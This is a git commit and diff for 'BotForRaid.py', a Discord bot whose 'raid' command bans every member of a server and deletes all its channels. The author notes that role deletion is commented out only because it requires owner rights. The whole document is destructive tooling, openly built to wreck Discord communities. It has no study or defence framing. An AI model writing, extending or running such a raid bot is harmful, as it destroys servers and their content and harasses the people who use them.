06ad023cf827ad8e77c11a0b0dd8f68b326187f3
estemobs#9212 <57631804+Estemobs@users.noreply.github.com>
2020-10-16 09:43:19 +0200

    steps 1 completed
    for now the program removes all lounges, vocals and category and banned all members
    To delete all the roles I did not succeed because you have to be owner for all deleted

--- BotForRaid.py
+++ BotForRaid.py
@@ -8,19 +8,23 @@ bot = commands.Bot(command_prefix='r')
 
 @bot.listen()
 async def on_ready():
-    print('raid bot prêt')
+    print('BotForRaid ready')
+
+#step 1 is finished for the deletion of role I put a program in # because it is impossible to delete all the roles and 
+#since to delete all the roles you must be the owner of the server
 
 
 @bot.command(pass_context = True)
 async def raid(ctx):
         for user in ctx.guild.members:
-            try:
-                await user.ban()
-            except:
-                pass
-        
+            await user.ban()
         for channel in ctx.guild.channels:
-                    await channel.delete()
+            await channel.delete()
+        #for role in ctx.guild.roles:
+            #await role.delete()
+        
+
+
 
 
 
